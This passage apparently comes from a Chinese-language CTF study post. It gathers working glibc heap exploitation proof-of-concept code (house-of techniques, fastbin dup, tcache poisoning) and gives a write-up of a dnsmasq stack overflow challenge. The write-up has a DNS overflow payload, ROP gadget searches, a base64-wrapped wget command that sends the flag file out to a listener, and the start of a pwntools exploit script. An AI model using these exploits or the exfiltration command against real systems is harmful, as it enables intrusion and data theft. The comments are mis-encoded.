((char *)victim2)[-8] = '\x00';
free(victim);

//åˆå¹¶å®Œåè¿›unsortbinï¼Œç›´æ¥åˆ‡å‰²å°±æ˜¯fakechunkçš„ä½ç½®
void *merged = malloc(0x100);
memset(merged, 'A', 0x80)
memset(prev2, 'C', 0x80);

assert(strstr(merged, "CCCCCCCCC"));
```


##### overlapping_chunks

ç›´æ¥ä¿®æ”¹sizeå¯¼è‡´æº¢å‡ºçš„åˆ—å­

```c
long *p1,*p2,*p3,*p4;
p1 = malloc(0x80 - 8);
p2 = malloc(0x500 - 8);
p3 = malloc(0x80 - 8);

memset(p1, '1', 0x80 - 8);
memset(p2, '2', 0x500 - 8);
memset(p3, '3', 0x80 - 8);

int evil_chunk_size = 0x581;
int evil_region_size = 0x580 - 8;

*(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
free(p2);
p4 = malloc(evil_region_size);

memset(p4, '4', evil_region_size);
memset(p3, '3', 80);
assert(strstr((char *)p4, (char *)p3));

```

##### mmap_overlapping_chunks

mmapchunkä¸ä½¿ç”¨fdå’Œbk

```c
/*
================================================
running program
heap
....
third mmap chunk
second mmap chunk
LibC
....
ld
first mmap chunk
===============================================
*/
int* ptr1 = malloc(0x10);

long long* top_ptr = malloc(0x100000);
long long* mmap_chunk_2 = malloc(0x100000);
long long* mmap_chunk_3 = malloc(0x100000);

//ä¿®æ”¹sizeä½ä¸º2+3çš„å¤§å°
mmap_chunk_3[-1] = (0xFFFFFFFFFD & mmap_chunk_3[-1]) + (0xFFFFFFFFFD & mmap_chunk_2[-1]) | 2;

free(mmap_chunk_3);

//åœ¨3çš„ä¸Šé¢
long long* overlapping_chunk = malloc(0x300000);
int distance = mmap_chunk_2 - overlapping_chunk;
overlapping_chunk[distance] = 0x1122334455667788;
assert(mmap_chunk_2[0] == overlapping_chunk[distance]);
```

##### house_of_water


åœ¨tachemetaé‡Œæ„é€ fakechunk

ç¨‹åºå­˜åœ¨UAFæ¼æ´
ç¨‹åºå¯ä»¥ç”³è¯·ä½å¤Ÿå¤§çš„å †å—

ä¸éœ€è¦æ³„éœ²ä»»ä½•å†…å­˜åœ°å€ä¸”ä¸éœ€è¦ä»»ä½•å †ä¸Šçš„æº¢å‡º


```c
//åœ¨tcache metaé‡Œå¯¹äºå¤§å°æ•°é‡çš„ä½ç½®å¢1ï¼Œå¾—åˆ°ä¸€ä¸ª0x0000000000010001
void *fake_size_lsb = malloc(0x3d8);
void *fake_size_msb = malloc(0x3e8);
free(fake_size_lsb);
free(fake_size_msb);

//å‡†å¤‡å¥½ç”¨æ¥å¡«å……0x90binsçš„å †å—
void *metadata = (void *)((long)(fake_size_lsb) & ~(0xfff));
void *x[7];
for (int i = 0; i < 7; i++) {
	x[i] = malloc(0x88);
}

//å‡†å¤‡å¥½ä¸‰ä¸ªç”¨äºæ”¾å…¥unsortbinçš„0x90å †å—
void *unsorted_start = malloc(0x88);
_ = malloc(0x18); // Guard chunk
void *unsorted_middle = malloc(0x88);
_ = malloc(0x18); // Guard chunk
void *unsorted_end = malloc(0x88);
_ = malloc(0x18); // Guard chunk


//è®¾ç½®å¥½fakechunk0x10001çš„ä¸‹ä¸ªå †å—çš„prev_sizeå’Œin_use
//0x000055f9225aa080+0x10000=0x000055f9225ba080==nextchunk_header==endoffake_content
_ = malloc(0xf000);
void *end_of_fake = malloc(0x18); // Metadata chunk
*(long *)end_of_fake = 0x10000;
*(long *)(end_of_fake+0x8) = 0x20;

//å¡«æ»¡0x90bins
for (int i = 0; i < 7; i++) {
	free(x[i]);
}

//æ¥ä¸‹æ¥ä¼ªé€ fakechunkçš„fdå’Œbkï¼Œåˆ†åˆ«å¯¹åº”äº†0x20å’Œ0x30çš„é¦–ä¸ªå—çš„åœ°å€
*(long*)(unsorted_start-0x18) = 0x31; 
free(unsorted_start-0x10);
*(long*)(unsorted_start-0x8) = 0x91;//æ¢å¤size

*(long*)(unsorted_end-0x18) = 0x21; 
free(unsorted_end-0x10);
*(long*)(unsorted_end-0x8) = 0x91; //æ¢å¤size


free(unsorted_end);
free(unsorted_middle);
free(unsorted_start);
/*
        - Unsorted bin:
                unsorted_start <--> unsorted_middle <--> unsorted_end
                0x55f9225aae50 <--> 0x55f9225aaf00 <--> 0x55f9225aafb0
        - 0x20 t-cache:
                * 0x55f9225aafb0
        - 0x30 t-cache
                * 0x55f9225aae50
*/

//start->fd->fakeheader
//end->bk->fakeheader
//ç­‰åŒäºæ›¿æ¢äº†unsortbiné“¾è¡¨ä¸­unsorted_middleçš„ä½ç½®å”¯ä¸€ä¸€ä¸ªlargebinï¼Œç›´æ¥ç”³è¯·å³å¯
*(unsigned long *)unsorted_start = (unsigned long)(metadata+0x80);
*(unsigned long *)(unsorted_end+0x8) = (unsigned long)(metadata+0x80);

//sizeåœ¨0x10000å†…
void *meta_chunk = malloc(0x288);


/*
0x000055f9225aa070              0x0000000000000000  0x0000000000000000
0x000055f9225aa080              0x0000000000000000  0x0000000000000291
0x000055f9225aa090              0x00007fc85b6db360  0x00007fc85b6db360
0x000055f9225aa0a0              0x000055f9225aa080  0x000055f9225aa080
*/
assert(meta_chunk == (metadata+0x90)); 


```

##### house_of_tangerine

æ³¨æ„è¦å»é™¤fencepost
5æ¬¡malloc+3æ¬¡oobæˆ–è€…BOF

```c

//heap_ptr = malloc(0x10);
//top_size = heap_ptr[3];//0x20d51

//åˆ‡å‰²topchunk,ä½¿å¾—å‰©ä¸‹éƒ¨åˆ†åä¸‰ä½ä¸ºæˆ‘ä»¬éœ€è¦çš„sizeï¼Œç„¶åä¿®æ”¹topchunksizeä½ï¼Œåä¸‰ä½ç›¸åŒå³å¯
size_2 = 0xce0
heap_ptr = malloc(size_2);
top_size_ptr = &heap_ptr[(size_2 / SIZE_SZ) - 1 + (MALLOC_ALIGN / SIZE_SZ)];
top_size = *top_size_ptr;
new_top_size = top_size & PAGE_MASK;
*top_size_ptr = new_top_size;
//è¢«freeçš„æ—§topchunksizeè¿˜è¦å‡å»FENCEPOSTä¸€èˆ¬ä¸º0x20
freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
heap_ptr = malloc(SIZE_3);

//-----------------------------------------------------------
//å¯¹æ–°åˆ†é…çš„ä¸€é¡µåŒæ ·çš„æ–¹å¼è¿›è¡Œå¤„ç†ï¼Œå·²ç»åˆ†é…è¿‡size_3çš„å¤§å°äº†
top_size = heap_ptr[(SIZE_3 / SIZE_SZ) + 1];//0x21061
new_top_size = top_size & PAGE_MASK;
heap_ptr[(SIZE_3 / SIZE_SZ) + 1] = new_top_size;
freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
vuln_tcache = (size_t) &heap_ptr[(SIZE_3 / SIZE_SZ) + 2];
heap_ptr = malloc(SIZE_3);

//-----------------------------------------------------------
//å¾—åˆ°2ä¸ª0x40çš„tcachechunkï¼Œä¿®æ”¹fdåŠ«æŒ
heap_ptr[(vuln_tcache - (size_t) heap_ptr) / SIZE_SZ] = target ^ (vuln_tcache >> 12);

heap_ptr = malloc(SIZE_1);
heap_ptr = malloc(SIZE_1);
 assert((size_t) heap_ptr == target);

```

#####  house_of_spirit

```c
//å‡†å¤‡å¡«æ»¡0x40binsçš„tcache
void *chunks[7];
for(int i=0; i<7; i++) {
	chunks[i] = malloc(0x30);
}
for(int i=0; i<7; i++) {
	free(chunks[i]);
}

//åœ¨ç›®æ ‡ä½ç½®ä¼ªé€ chunkï¼Œè¦ä¼ªé€ 2ä¸ªï¼Œç¬¬äºŒä¸ªä¸éœ€è¦fastbinå¤§å°ï¼Œfastbinåœ¨é‡Šæ”¾æ—¶ä¼šæ ¡éªŒnextchunksizeå¿½ç•¥prev_sizeä½ï¼Œä»¥åŠæ˜¯å¦ä¸ºå½“å‰biné“¾è¡¨å¤´èŠ‚ç‚¹
long fake_chunks[10] __attribute__ ((aligned (0x10)));
fake_chunks[1] = 0x40; // this is the size
fake_chunks[9] = 0x1234; // nextsize

void *victim = &fake_chunks[2];
free(victim);

//callocä¸åˆ†é…tcacheç©ºé—²å—ï¼Œç”¨mallocä¹Ÿå¯ä»¥ä½†å¾—ç”¨8æ¬¡
void *allocated = calloc(1, 0x30);
assert(allocated == victim);

```

#####  house_of_mind_fastbinï¼ˆè·³ï¼‰

```c
int HEAP_MAX_SIZE = 0x4000000;
int MAX_SIZE = (128*1024) - 0x100;

uint8_t* fake_arena = malloc(0x1000); 
uint8_t* target_loc = fake_arena + 0x30;
uint8_t* target_chunk = (uint8_t*) fake_arena - 0x10;

fake_arena[0x888] = 0xFF;
fake_arena[0x889] = 0xFF; 
fake_arena[0x88a] = 0xFF;

uint64_t new_arena_value = (((uint64_t) target_chunk) + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1);
uint64_t* fake_heap_info = (uint64_t*) new_arena_value;

uint64_t* user_mem = malloc(MAX_SIZE);

while((long long)user_mem < new_arena_value){
	user_mem = malloc(MAX_SIZE);
}


uint64_t* fastbin_chunk = malloc(0x50); // Size of 0x60
uint64_t* chunk_ptr = fastbin_chunk - 2; // Point to chunk instead of mem

uint64_t* tcache_chunks[7];
for(int i = 0; i < 7; i++){
	tcache_chunks[i] = malloc(0x50);
}	
for(int i = 0; i < 7; i++){
	free(tcache_chunks[i]);
}
fake_heap_info[0] = (uint64_t) fake_arena; // Setting the fake ar_ptr (arena)

chunk_ptr[1] = 0x60 | 0x4; 
free(fastbin_chunk);

assert(*((unsigned long *) (target_loc)) != 0);

```


##### house_of_lore

é€šè¿‡ä¿®æ”¹smallbinchunkçš„bkæŒ‡é’ˆï¼Œå†ç”³è¯·å›æ¥ï¼Œä¼šä½¿å¾—å…¶bké“¾ä¸Šçš„å †å—è¢«æ”¾å…¥tcacheï¼Œç”¨äºåŠ«æŒæ ˆåœ°å€
smallbiné“¾æŒ‡é’ˆæŒ‡å‘çš„éƒ½æ˜¯headerå¤´éƒ¨

```c
intptr_t* stack_buffer_1[4] = {0};
intptr_t* stack_buffer_2[4] = {0};
void* fake_freelist[7][4];
intptr_t *victim = malloc(0x100);

//ç”¨äºå¡«å……tcache
void *dummies[7];
for(int i=0; i<7; i++) dummies[i] = malloc(0x100);
intptr_t *victim_chunk = victim-2;//æ‹¿chunkheaderå¤´çš„åœ°å€

//åœ¨æ ˆä¸Šæ„é€ BKæŒ‡é’ˆé“¾ï¼Œfake_freelist[i]æŒ‡å‘headerå¤´
for(int i=0; i<6; i++) {
fake_freelist[i][3] = fake_freelist[i+1];
}
fake_freelist[6][3] = NULL;

//ç»•è¿‡æ£€æŸ¥ï¼Œè¿›ä¸€æ­¥è®¾ç½®åŒå‘é“¾ï¼Œä¸»è¦æ˜¯fdè¦æŒ‡å›smallbinchunk
stack_buffer_1[0] = 0;
stack_buffer_1[1] = 0;
stack_buffer_1[2] = victim_chunk;//fdæŒ‡é’ˆ
stack_buffer_1[3] = (intptr_t*)stack_buffer_2;//bkæŒ‡é’ˆ

stack_buffer_2[2] = (intptr_t*)stack_buffer_1;//fdæŒ‡é’ˆ
stack_buffer_2[3] = (intptr_t *)fake_freelist[0];//bkæŒ‡é’ˆ


//é˜²æ­¢victimå’Œtopchunkåˆå¹¶
void *p5 = malloc(1000);

//å°†victim_chunkå¡å…¥smallbin
for(int i=0; i<7; i++) free(dummies[i]);
free((void*)victim);
void *p2 = malloc(1200);


//ï¼ï¼ï¼æ¼æ´ç‚¹ï¼Œè®¾ç½®smallbinchunkâ€”â€”>bkæŒ‡å‘BKé“¾
victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack


//ç”³è¯·å›æ¥
for(int i=0; i<7; i++) malloc(0x100);
void *p3 = malloc(0x100);//victimchunk
//è¿™é‡Œbké“¾å°±ä¼šè¢«æ”¾å…¥tcache
char *p4 = malloc(0x100);//stack_addr_tcachechunk

//è®¡ç®—ä¸æ ˆåº•çš„åç§»åŠ«æŒè¿”å›åœ°å€
intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
long offset = (long)__builtin_frame_address(0) - (long)p4;
memcpy((p4+offset+8), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary

// sanity check
assert((long)__builtin_return_address(0) == (long)jackpot);
```

##### house_of_einherjar


æœ¬è´¨ä¸Šoffbynullé«˜ç‰ˆæœ¬å‘ä¸Šåˆå¹¶ï¼Œæ³¨æ„check

```c
//è·å–å¯¹é½çš„æ ˆåœ°å€
intptr_t stack_var[0x10];
intptr_t *target = NULL;
for(int i=0; i<0x10; i++) {
	if(((long)&stack_var[i] & 0xf) == 0) {
		target = &stack_var[i];
		break;
	}
}

//æ„é€ a/b/cæ ¼å¼
//aæŠŠæŒ‡é’ˆæŒ‡å‘è‡ªå·±æ¥ç»•è¿‡æ£€æŸ¥
intptr_t *a = malloc(0x38);
a[0] = 0;	// prev_size (Not Used)
a[1] = 0x60; // size
a[2] = (size_t) a; // fwd
a[3] = (size_t) a; // bck

//bç”¨æ¥å¯åŠ¨tcache poison
uint8_t *b = (uint8_t *) malloc(0x28);
int real_b_size = malloc_usable_size(b);//0x28
uint8_t *c = (uint8_t *) malloc(0xf8);
uint64_t* c_size_ptr = (uint64_t*)(c - 8);

// VULNERABILITY
b[real_b_size] = 0;
// VULNERABILITY

//ä¿®æ”¹cçš„prevsizeå’Œaçš„sizeï¼Œfake_chunksize == 0x60
size_t fake_size = (size_t)((c - sizeof(size_t) * 2) - (uint8_t*) a);
*(size_t*) &b[real_b_size-sizeof(size_t)] = fake_size;//prev_size
a[1] = fake_size;


//fill tcache
intptr_t *x[7];
for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
	x[i] = malloc(0xf8);
}
for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
	free(x[i]);
}
free(c);//å¤§åˆå¹¶è¿›unsortbin

//ç”³è¯·å‡ºæ¥ï¼Œåç»­å°±æ˜¯tcachepoison
intptr_t *d = malloc(0x158);
uint8_t *pad = malloc(0x28);
free(pad);
free(b);
//æ”¹fd
d[0x30 / 8] = (long)target ^ ((long)&d[0x30/8] >> 12);

malloc(0x28);
intptr_t *e = malloc(0x28);
assert(e == target);

```

##### house_of_botcake


æœ¬æ¥freeæ‰çš„å †å—å³ä¾¿åœ¨unsortbiné‡Œï¼Œä¹Ÿä¸èƒ½å†æ¬¡free
åœ¨å…¶ä¸Šæ–¹ä¹Ÿfreeä¸€ä¸ªå †å—ä½¿å¾—ä»–ä»¬åˆå¹¶ï¼Œè¿™æ ·å°±èƒ½å†æ¬¡freeè¿›å…¥tcache

```c

//å‡†å¤‡ä¸€ä¸ªæ ˆåœ°å€
intptr_t stack_var[4];
//ç”¨äºå¡«å……tcacheçš„å †
intptr_t *x[7];
for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
	x[i] = malloc(0x100);
}

//2ä¸ªå¤§å°äº’è¡¥çš„å †å—
intptr_t *prev = malloc(0x100);
intptr_t *a = malloc(0x100);
malloc(0x10);

//å¡«å……tcache
for(int i=0; i<7; i++){
	free(x[i]);
}

//free2ä¸ªå †å—åˆ°unsortbinåˆå¹¶ï¼Œæ­¤æ—¶åˆå¹¶åˆ°prev
free(a);
free(prev);

//å†ç”³è¯·ä¸€ä¸ªtcacheï¼Œå°†aå†æ¬¡free
malloc(0x100);
/*VULNERABILITY*/
free(a);// a is already freed
/*VULNERABILITY*/


//æ­¤æ—¶tcacheå’ŒunsortBiné‡Œéƒ½æœ‰a
int prev_size = prev[-1] & 0xff0;//0x220
int a_size = a[-1] & 0xff0;//0x110

a = malloc(0x100);
memset(a, 0, 0x100);
prev[0x110/sizeof(intptr_t)] = 0x41414141;//açš„prevsizeä½
assert(a[0] == 0x41414141);
```


##### fastbin_reverse_into_tcache

```c

const size_t allocsize = 0x40;

char* ptrs[14];
size_t i;
for (i = 0; i < 14; i++) {
	ptrs[i] = malloc(allocsize);
}

// Fill the tcache.
for (i = 0; i < 7; i++) free(ptrs[i]);

char* victim = ptrs[7];
free(victim);

// Fill the fastbin.
for (i = 8; i < 14; i++) free(ptrs[i]);

size_t stack_var[6];
memset(stack_var, 0xcd, sizeof(stack_var));

//------------VULNERABILITY-----------

// Overwrite linked list pointer in victim.
// The following operation assumes the address of victim is known, thus requiring
// a heap leak.
*(size_t**)victim = (size_t*)((long)&stack_var[0] ^ ((long)victim >> 12));//FDæŒ‡é’ˆ
//------------------------------------
// Empty tcache.
for (i = 0; i < 7; i++) ptrs[i] = malloc(allocsize);


//å†ç”³è¯·ä¸€ä¸ªï¼Œfastbiné‡Œçš„chunkè¢«å€’å…¥tcachebin
malloc(allocsize);
char *q = malloc(allocsize);
assert(q == (char *)&stack_var[2]);

```

##### fastbin_dup_into_stack

fastbinä¸‹çš„doublefree

```c
void *ptrs[7];

//å¡«å……tcache
for (int i=0; i<7; i++) {
	ptrs[i] = malloc(8);
}
for (int i=0; i<7; i++) {
	free(ptrs[i]);
}

//ç”³è¯·ä¸‰ä¸ªå †å—ï¼Œé‡Šæ”¾åˆ°fastbin
int *a = calloc(1,8);
int *b = calloc(1,8);
int *c = calloc(1,8);

//ç”±äºfastbiné‡Šæ”¾æ£€æµ‹fastbiné“¾è¡¨å¤´éƒ¨å †å—ï¼Œæ‰€ä»¥é—´éš”doublefree
free(a);
free(b);
free(a);

//ç”³è¯·å›a
unsigned long *d = calloc(1,8);
calloc(1,8)//b

stack_var[1] = 0x20;//ä¼ªé€ size

unsigned long ptr = (unsigned long)stack_var;
unsigned long addr = (unsigned long) d;
/*VULNERABILITY*/
*d = (addr >> 12) ^ ptr;//ä¿®æ”¹fastbinchunkFDæŒ‡é’ˆ
/*VULNERABILITY*/

calloc(1,8)
void *p = calloc(1,8);
assert((unsigned long)p == (unsigned long)stack_var + 0x10);

```

##### fastbin_dup

å’Œä¸Šé¢ä¸€æ ·çš„ï¼Œdupï¼Œæ„æ€æ˜¯doublefree use poison? duplication

```c
void *ptrs[8];
for (int i=0; i<8; i++) {
	ptrs[i] = malloc(8);
}
for (int i=0; i<7; i++) {
	free(ptrs[i]);
}

int *a = calloc(1, 8);
int *b = calloc(1, 8);
int *c = calloc(1, 8);

free(a);
free(b);
free(a);

a = calloc(1, 8);
b = calloc(1, 8);
c = calloc(1, 8);

assert(a == c);
```

##### fastbin_dup_consolidate

```c
void *ptr[7];

for(int i = 0; i < 7; i++)
	ptr[i] = malloc(0x40);
for(int i = 0; i < 7; i++)
	free(ptr[i]);

void* p1 = calloc(1,0x40);
free(p1);

//malloc_consolidate we need to allocate a chunk with large chunk size (>= 0x400)
void* p3 = malloc(0x400);
//malloc_consolidate will merge the fast chunk p1 with top.
assert(p1 == p3);

free(p1); // vulnerability
void *p4 = malloc(0x400);
assert(p4 == p3);
```

## Pwn challenge ğŸ¤º

### 2022ACTF master_of_dns

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155042.png)

é¢˜ç›®èµ·äº†ä¸€ä¸ªdnsæœåŠ¡å™¨ï¼Œé€šè¿‡idaf12æœç´¢ç‰ˆæœ¬å·å¯ä»¥çŸ¥é“ç‰ˆæœ¬ä¸º
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155141.png)

ä¸‹è½½ä¸€ä¸ªdnsmasqè¿›è¡Œç¼–è¯‘ï¼Œè¿™é‡Œè¿˜è¦æ³¨æ„ç¼–è¯‘çš„gccç‰ˆæœ¬
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155352.png)

```
wget https://thekelleys.org.uk/dnsmasq/dnsmasq-2.86.tar.gz
tar -zxvf dnsmasq-2.86.tar.gz
cd dnsmasq-2.86
æ·»åŠ 
# CFLAGS        = -m32 -fno-stack-protector
# LDFLAGS       = -m32 -no-pie
make
```

ç¼–è¯‘å¥½äº†ä»¥åç”¨idaè¿›è¡Œbinddiffï¼Œé€‰æ‹©ç›¸ä¼¼åº¦ä¸ä¸ºç™¾åˆ†ä¹‹ç™¾çš„å‡½æ•°è¿›è¡ŒæŸ¥çœ‹ï¼Œå…¶ä¸­extract_nameå‡½æ•°ä¸­ï¼Œé¢˜ç›®ç»™çš„ç‰ˆæœ¬å¤šäº†ä¸€ä¸ªmemcpyå‡½æ•°ï¼Œç”±äºæ²¡æœ‰PIEï¼Œæˆ‘ä»¬ç›´æ¥ä¸‹æ–­ç‚¹ï¼Œçœ‹å®ƒçš„å‚æ•°
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155509.png)

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155645.png)


![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227132854.png)

ç»“åˆIDAçœ‹æ ˆæ˜¯0x381+4=0x385çš„æº¢å‡ºï¼ŒåŒæ—¶æº¢å‡ºçš„næ˜¯æœ‰é™åˆ¶çš„ï¼Œä½†æ˜¯ä»»ç„¶æ»¡è¶³æ ˆæº¢å‡ºæ¡ä»¶

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155756.png)

ç¼–å†™è„šæœ¬ç¡®è®¤æº¢å‡ºï¼Œç”±äºä¸çŸ¥é“æŠ¥æ–‡çš„å…·ä½“å‘é€æ–¹å¼ï¼Œå¸¸è§„æ€è·¯å¯èƒ½ä¼šé€‰æ‹©é€†å‘æŠ¥æ–‡ï¼Œä½†è¿™é‡Œå¯ä»¥ç”¨winsharkæŠ“åŒ…(è¿™é‡ŒUDP BPæ„Ÿè§‰åº”è¯¥æŠ“ä¸äº†)
```shell
dig @127.0.0.1 -p 9999 baidu.com
```

ç”±äºæœ¬åœ°æœåŠ¡èµ·åœ¨127.0.0.1ä¸Šï¼Œç›‘å¬loå³å¯ï¼Œå¾ˆå¿«å°±æŠ“åˆ°äº†æŠ¥æ–‡ï¼Œä½†æ˜¯æ•°æ®åŒ…æ—¶dataæ ¼å¼ï¼Œè¿™é‡Œå³é”®dataï¼Œé€‰æ‹©åè®®é¦–é€‰é¡¹
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227160517.png)

ç„¶åå°±èƒ½æ­£å¸¸è¯†åˆ«äº†ï¼Œè§‚å¯ŸæŸ¥è¯¢è¯·æ±‚çš„åŒ…ï¼Œç”±äºæº¢å‡ºéƒ¨åˆ†åªæ˜¯åŸŸåéƒ¨åˆ†ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨åŸŸå
è¿™ä¸ªåŒ…é‡Œå¿…é¡»å­—æ®µä¸ºDomain Name Systemè¿™ä¸ªæ®µ
åœ¨dnsè¯·æ±‚æŠ¥æ–‡ä¸­ï¼ŒåŸŸåå­—æ®µï¼Œé€šè¿‡"."åˆ†éš”å¼€ï¼Œç‚¹ä¸ç‚¹ä¹‹é—´çš„å­—ç¬¦ä¸ªæ•°å¿…é¡»<=0x3f
è€Œä¸”ä¼šæŠŠbaidu.comå…¶ä¸­çš„ç‚¹æ‹†æˆé•¿åº¦ \x05 baidu \x03 com \x00
æˆ‘ä»¬ä¿ç•™è¿™ä¸€æ®µçš„å¤´å°¾ï¼Œå°±æ›¿æ¢åŸŸåéƒ¨åˆ†ï¼Œ'\x3f'+'a'\*0x3fä¸ºä¸€æ®µï¼Œå…±é•¿0x40ï¼Œæˆ‘ä»¬ç»™0x10è¯•è¯•
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227160536.png)

ç¡®è®¤èƒ½æº¢å‡ºåï¼Œè¿›ä¸€æ­¥è°ƒæ•´é•¿åº¦0x385ï¼Œå°è¯•æ§åˆ¶æ‰§è¡Œæµåˆ°beef

```python

head = "24b401200001000000000001".decode("hex")
payload = ("\x3f"+'a'*0x3f)*14+"\x04aaaa"
payload += "\x04beef"

end =  '\x00'+"00010001".decode("hex")

s(head+payload+end)
```

ä¹Ÿæ²¡é—®é¢˜ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•å¸¦flagå›æ¥äº†ï¼Œè¿™é‡Œæ˜¯UDPï¼Œå†ä¸€ä¸ªORWç¡®å®éº»çƒ¦ã€‚è¿™é‡Œè€ƒè™‘ç”¨systemæˆ–è€…popenæ‰§è¡Œåå¼¹shellè¯­å¥ã€‚è¿™é‡Œåˆ©ç”¨wgetå»è·å–127.0.0.1/flag{xxx}ï¼Œç„¶åå¦ä¸€ç«¯åœ¨80ç«¯å£ç›‘å¬å³å¯æ‹¿åˆ°ç»“æœ

```python
# cmd = b'wget `echo -e "%s"`/`cat /flag`' % (vps.replace(b'.',b'\\x2e'))
cmd = b"echo d2dldCAxMjcuMC4wLjEvYGNhdCAvZipgCg== | base64 -d | sh"
# wget 127.0.0.1/`cat /f*`


nc -l 80

âœ  attachment sudo nc -l 80
GET /flag%7Bpwnbye4l4%7D HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 127.0.0.1
Connection: Keep-Alive
Connection: Keep-Alive

```

ç¨‹åºé‡Œæ­£å¥½æœ‰popenå‡½æ•°ï¼Œç„¶åå°±æ˜¯æ‰¾gadgetç»™å‚æ•°èµ‹å€¼
+ popençš„2ä¸ªå‚æ•°å¿…é¡»éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œ"r"æœ‰äº†ï¼Œä½†æ˜¯cmdè¿˜æ²¡æœ‰
+ ä¸èƒ½æœ‰ç©ºå­—ç¬¦

```c
.text:08071802 52                            push    edx                             ; modes
.text:08071803 50                            push    eax                             ; command
.text:08071804 E8 37 93 FD FF                call    _popen
```

è§‚å¯Ÿcrashæ—¶çš„æ ˆçŠ¶æ€
edxä¸ºmemcpyèµ‹å€¼æ ˆåœ°å€çš„å¼€å§‹ï¼Œä½†edxæ˜¯ç¬¬äºŒä¸ªå‚æ•°çš„èµ‹å€¼å¯„å­˜å™¨ï¼Œåªéœ€è¦"r"ï¼Œä¸éœ€è¦æˆ‘ä»¬è¾“å…¥ï¼Œè€Œeaxæˆ‘ä»¬ç¼ºéš¾ä»¥èµ‹å€¼ä¸ºæœ‰æ•ˆçš„åœ°å€(è¿™é‡Œ2ä¸ªå‚æ•°éƒ½æ˜¯åœ°å€)ï¼Œæ‰€ä»¥è€ƒè™‘ä½¿ç”¨gadgetå°†edxçš„å€¼èµ‹å€¼ç»™eax

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227161823.png)

è¿™é‡Œæœ‰å¤šå¯ä»¥è€ƒè™‘çš„æ±‡ç¼–æŒ‡ä»¤

```
xchg äº¤æ¢å¯„å­˜å™¨
add åŠ å‡ ç»™ä¸€ç›®æ ‡å¯„å­˜å™¨èµ‹0ä¹Ÿèƒ½å®ç°æ•ˆæœ

ROPgadget --binary ./dns  | grep  "xchg eax, edx"
ROPgadget --binary ./dns  | grep  "add eax, edx" | grep ret
ROPgadget --binary ./dns  | grep  "xor eax, eax"
ROPgadget --binary ./dns  | grep ret |grep  "mov eax, 0"
ROPgadget --binary ./dns  | grep ret | grep -v "ret " | grep  ": add eax, 0x"
```

ç»“åˆè¿™å‡ ç‚¹æœ€ç»ˆçš„æ€è·¯æ˜¯ï¼Œç»™eaxä¸€ä¸ªè´Ÿæ•°ï¼Œè¿™æ ·åªéœ€è¦å¯¹å®ƒè¿›è¡Œaddæ“ä½œå°±èƒ½æ§åˆ¶eaxçš„å€¼ã€‚é—®é¢˜åœ¨äºpayloadåªèƒ½è¿ç»­0x3fï¼Œæ‰€ä»¥è¦æ§åˆ¶ROPçš„éƒ¨åˆ†åœ¨0x3fä»¥å†…ï¼Œè¿˜å¥½æ˜¯32ä½æ¯”è¾ƒå¥½å®ç°ã€‚æ­£å¥½æº¢å‡ºé•¿åº¦èƒ½æ»¡è¶³2æ®µROPï¼Œä¸€æ®µæ”¾ROPï¼Œä¸€æ®µæ”¾cmdå­—ç¬¦ä¸²ã€‚è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ç›´æ¥æŠŠcmdæ”¾åœ¨å¼€å¤´å¥½ä¸å¥½ï¼Œåœ¨å®é™…æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šå¯¼è‡´åœ¨æ‰§è¡Œå‡½æ•°æ—¶ä¼šå‘ä½ä½å¢é•¿ï¼Œå¯èƒ½ä¼šæŠŠcmdè¦†ç›–æ‰å¯¼è‡´æ— æ³•é¡ºåˆ©æ‰§è¡Œã€‚æœ€å¥½çš„æƒ…å†µè¿˜æ˜¯æ”¾åˆ°é«˜ä½ä¸Šã€‚

å†™EXPçš„tips

```python
# åœ¨python2ä¸‹
head = "61".decode("hex")
# å°†å…¶è¯†åˆ«ä¸º16è¿›åˆ¶æ•°çš„æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œå°†å…¶è½¬åŒ–ä¸ºå­—èŠ‚æµ


# system(cmd)/popen(cmd,"r"/"w")
cmd_string = base64.b64encode("wget 127.0.0.1/`cat /f*`")
cmd = "echo {} | base64 -d | sh".format(cmd_string)

```


EXP

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256
from scapy.all import *
import base64

p = remote("127.0.0.1","9999",typ="udp")
# p = process("./pwn")
elf = ELF("./dns")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
